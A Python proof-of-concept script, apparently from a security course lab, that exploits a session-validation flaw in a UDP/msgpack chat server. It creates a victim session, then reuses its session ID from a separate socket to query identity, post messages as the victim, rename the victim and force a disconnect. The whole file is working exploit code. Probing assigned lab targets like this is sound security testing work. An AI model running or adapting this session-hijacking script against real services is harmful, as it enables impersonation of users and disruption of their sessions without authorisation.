"""
Deep probe: Session Hijacking via source-agnostic session validation.
The server accepts a session ID from any source socket, not just the
original connecting socket. This probe confirms the full impact.
"""
import socket, msgpack, random, time
HOST, PORT = 'csc4026z.link', 51825

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5.0)
    s.connect((HOST, PORT))
    s.send(msgpack.packb({'request_type': 1, 'request_handle': random.randrange(1, 2**32)}))
    r = msgpack.unpackb(s.recv(4096), raw=True)
    return s, r[b'session'], r.get(b'username', b'').decode()

def req(s, msg):
    s.send(msgpack.packb(msg))
    try: return msgpack.unpackb(s.recv(4096), raw=True)
    except socket.timeout: return None

def h(): return random.randrange(1, 2**32)

print('=== DEEP PROBE: Session Hijacking Impact ===\n')

# Step 1: Victim connects, sets a recognizable username, joins a channel
sock_victim, sess_victim, _ = connect()
req(sock_victim, {'request_type': 13, 'session': sess_victim,
                  'request_handle': h(), 'username': 'clear-victim99'})
channel = f'hijack-test-{random.randint(1000,9999)}'
req(sock_victim, {'request_type': 4, 'session': sess_victim, 'request_handle': h(),
                  'channel': channel, 'description': 'hijack test'})
print(f'Victim session: {sess_victim}')
print(f'Victim username set: clear-victim99')
print(f'Victim joined channel: {channel}\n')

# Step 2: Attacker socket (different socket entirely) uses victim session
sock_attacker = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock_attacker.settimeout(5.0)
sock_attacker.connect((HOST, PORT))

# Can attacker WHOAMI as victim?
r_whoami = req(sock_attacker, {'request_type': 11, 'session': sess_victim, 'request_handle': h()})
print(f'Attacker WHOAMI using victim session:')
print(f'  username: {r_whoami.get(b"username", b"").decode() if r_whoami else None}')
print(f'  transport: {r_whoami.get(b"transport", b"").decode() if r_whoami else None}')

# Can attacker send channel message AS victim?
r_msg = req(sock_attacker, {'request_type': 9, 'session': sess_victim, 'request_handle': h(),
                             'channel': channel, 'message': 'this was sent by the attacker'})
print(f'\nAttacker sends channel message as victim: type={r_msg.get(b"response_type") if r_msg else None}')

# Does victim receive it? (victim is also in the channel)
time.sleep(0.5)
sock_victim.settimeout(2.0)
msgs = []
for _ in range(5):
    try: msgs.append(msgpack.unpackb(sock_victim.recv(4096), raw=True))
    except socket.timeout: break
delivered = [m for m in msgs if m.get(b'message')]
if delivered:
    print(f'  Message delivered in channel from: {delivered[0].get(b"from_username", b"").decode()}')
    print(f'  Content: {delivered[0].get(b"message", b"").decode()}')

# Can attacker rename victim?
r_rename = req(sock_attacker, {'request_type': 13, 'session': sess_victim, 'request_handle': h(),
                                'username': 'clear-HIJACKED'})
print(f'\nAttacker renames victim: type={r_rename.get(b"response_type") if r_rename else None}')
if r_rename and r_rename.get(b'response_type') == 34:
    new_name = r_rename.get(b'new_username', b'').decode()
    print(f'  Victim now named: {new_name}')

# Can attacker disconnect victim?
r_disc = req(sock_attacker, {'request_type': 2, 'session': sess_victim, 'request_handle': h()})
print(f'\nAttacker sends DISCONNECT for victim: type={r_disc.get(b"response_type") if r_disc else None}')

# Is victim's session now dead?
time.sleep(0.3)
r_check = req(sock_victim, {'request_type': 3, 'session': sess_victim, 'request_handle': h()})
print(f'Victim session alive after attacker DISCONNECT: {r_check and r_check.get(b"response_type") == 24}')

sock_victim.close()
sock_attacker.close()
print('\nDone.')
